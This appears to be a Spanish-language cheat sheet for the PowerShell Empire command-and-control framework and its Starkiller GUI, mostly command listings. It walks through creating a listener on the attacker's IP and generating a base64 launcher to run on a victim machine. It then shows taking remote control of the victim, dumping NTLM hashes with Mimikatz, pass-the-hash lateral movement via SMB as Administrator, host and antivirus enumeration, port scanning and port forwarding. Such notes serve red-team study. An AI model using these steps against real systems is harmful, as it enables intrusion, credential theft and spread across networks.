# Powershell Empire & Starkiller 

Tags: #C2 #Starkiller #PSEmpire

```bash 
❯ https://github.com/BC-SECURITY/Empire
```

```bash 
# Modulos  
1. Assembly Execution 
2. BOF Execution 
3. Mimikatz
4. SeatBelt
5. Rubeus
6. SharpSploit
7. Certify
8. ProcessInjection

# Agents
1. PowerShell
2. Python3
3. C#
4. IronPython3
```

## Powershell Empire 

```bash 
# Usamos esta tool en la parte de 'POST-EXPLOTATION' una vez tenido el acceso a la maquina victima como 'Admin' en Windows

❯ apt install powershell-empire startkiller          # Instalamos  

❯ sudo powershell-empire server                      # Inicializamos el servidor 
❯ powershell-empire client                           # Iniciamos el PS-Empire cliente 
	❯ help                                          # Menu de ayuda 
	❯ uselistener http                              # Seleccionamos el 'listener' a usar 
		❯ options 
		❯ set Host <IP>                            # IP de la maquina de atacante 
		❯ set Port 8888
		❯ execute
		❯ main                                     # Regresas a la parte principal de 'Empire'
		
	❯ listeners                                     # Muestra los 'listeners' creados 
	❯ usestager multi/launcher                      # Seleccionamos el 'usestager'
		❯ set Listener http                        # Seleccionamos el 'listener' antes creado 
		❯ execute 
# Nota: Nos creara codigo en base64, el cual debemos de pegarlo en la maquina victima y ejecutarlo 

	❯ agents                                        # Muestra las maquina conectadas al 'Empire'
		❯ remane <OldName> <NewName>

	❯ interact <Name>                               # Conectarnos a la maquina victima para interactuar 
		❯ help                                     # Muestra la lista de comandos 
		❯ shell "hostname"
		❯ shell "whoami"
		❯ shell "whoami /priv"
		❯ history                                  # Miramos el resultado de los comandos 
		
	❯ usemodule powershell/situational_awareness/host/computerdetails 
		❯ set Agente <Name>
		❯ execute                                  # Traera los detalles de la computadora victima 
		❯ history                                  # Miramos el resultado del comando anterior 

	❯ usemodule powershell/situational_awareness/host/winenum 
		❯ info                                     # Este modulo recolecta info relevante acerca del host 
		❯ execute
		❯ history 

	❯ usemodule powershell/credentials/mimikatz/lsadump 
		❯ set Agente <Name>        
		❯ execute                                  # Nos dumpea con 'Mimikatz' el hash NTLM del usuario 
		❯ history                                  # Miramos el resultado anterior 

	❯ usemodule powershell/lateral_movement/invoke_smbexec 
		❯ set Username Administrator 
		❯ set Hash <NTLM_Hash>
		❯ set Command whoami
		❯ set ComputerName <IP>                    
		❯ execute
		❯ history

	❯ usemodule powershell/situational_awareness/network/powerview/get_domain_policy 
		❯ execute
		❯ history

	❯ usemodule powershell/situational_awareness/network/portscan 
		❯ set Hosts <IP>
		❯ execute 
		❯ history 

	❯ usemodule powershell/lateral_movement/invoke_portfwd
		❯ set Lhost <IP>
		❯ set Lport 445
		❯ set Rhost <IP>
		❯ set Rport 445
		❯ execute 
		❯ history 
```

## Starkiller 

```bash 
❯ sudo powershell-empire server                      # Inicializamos el servidor 

# Abrimos Starkiller GUI en Kali 'empireadmin/password123'

# Listener 
❯ http
❯ Host <IP>           # IP del atacante 
❯ Port 443
# Nota: Al finalizar le damos en 'submit'

# Stager 
❯ type multi/launcher
❯ listener http
# Nota: Al finalizar le damos en 'submit', despues le damos en los 3 puntos para hacer 'Copy to Clipboard' y lo pegamos en la maquina victima, despues lo ejecutamos y ahora en nuestro Starkiller tendremos un 'New Agent'

# Agents
# Nota: En las acciones podemos darle en 'View' para despues poder ejecutar comandos 
❯ whoami      # En la parte derecha podemos encontrar una consola que muestra los resultados de los comandos ingresados
❯ systeminfo 

	# Podemos ejecutar modulos 
	❯ powershell/situational_awareness/host/antivirusproduct 
	❯ powershell/situational_awareness/host/winenum 
```